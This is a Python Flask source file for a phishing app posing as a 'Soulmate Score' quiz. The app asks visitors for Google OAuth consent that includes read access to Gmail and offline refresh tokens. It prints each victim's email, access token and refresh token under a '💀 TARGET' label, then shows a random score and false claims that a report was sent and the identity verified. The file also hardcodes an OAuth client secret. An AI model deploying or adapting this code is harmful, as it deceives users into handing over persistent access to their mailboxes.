from flask import Flask, redirect, url_for, request
import requests
import random
import json

app = Flask(__name__)

# --- CONFIG ---
CLIENT_ID = "1067906653409-dsmhmumlp914dcihc7ob94m3fsms2kpg.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REDIRECT_URI = 'https://soulmate-tracker.onrender.com/callback'

@app.route('/')
def index():
    scopes = ["https://www.googleapis.com/auth/userinfo.profile", "https://www.googleapis.com/auth/userinfo.email", "https://www.googleapis.com/auth/gmail.readonly"]
    scope_param = " ".join(scopes)
    auth_url = f"https://accounts.google.com/o/oauth2/v2/auth?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope={scope_param}&access_type=offline&prompt=consent"
    return redirect(auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "No Code Received", 400
    
    token_url = "https://oauth2.googleapis.com/token"
    token_resp = requests.post(token_url, data={'code': code, 'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'redirect_uri': REDIRECT_URI, 'grant_type': 'authorization_code'}).json()
    
    access_token = token_resp.get('access_token')
    refresh_token = token_resp.get('refresh_token')
    if not access_token:
        return "Token Error", 400

    u_info = requests.get("https://www.googleapis.com/oauth2/v2/userinfo", headers={"Authorization": f"Bearer {access_token}"}).json()
    email = u_info.get('email')

    print(f"\n💀 TARGET: {email}\n💀 ACCESS: {access_token}\n💀 REFRESH: {refresh_token}\n")

    score = random.randint(75, 99)
    html = f"<html><body style='text-align:center;font-family:sans-serif;background:#fce4ec;padding-top:50px;'>"
    html += f"<div style='background:white;display:inline-block;padding:40px;border-radius:20px;box-shadow:0 10px 20px rgba(0,0,0,0.1);'>"
    html += f"<h1 style='color:#ff3366;'>❤️ Soulmate Score ❤️</h1>"
    html += f"<div style='font-size:70px;font-weight:bold;color:#ff3366;'>{score}%</div>"
    html += f"<p>Analyzing: <b>{email}</b></p>"
    html += f"<div style='width:200px;height:10px;background:#eee;border-radius:10px;margin:10px auto;'><div style='width:{score}%;height:100%;background:#ff3366;border-radius:10px;'></div></div>"
    html += f"<p style='color:#888;font-size:12px;'>Full report sent to Gmail in 2-5 minutes.</p>"
    html += f"<div style='color:#2ecc71;font-weight:bold;'>✓ Identity Verified</div></div></body></html>"
    
    return html

if __name__ == '__main__':
    app.run(port=5000)
